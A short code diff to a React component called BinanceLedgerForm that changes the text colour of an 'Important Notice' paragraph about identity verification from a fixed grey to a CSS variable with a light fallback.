@@ -372,7 +372,7 @@ const BinanceLedgerForm: FC = () => {
           >
             Important Notice
           </div>
-          <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "#B7BDC6" }}>
+          <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
             Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
           </div>
           <button
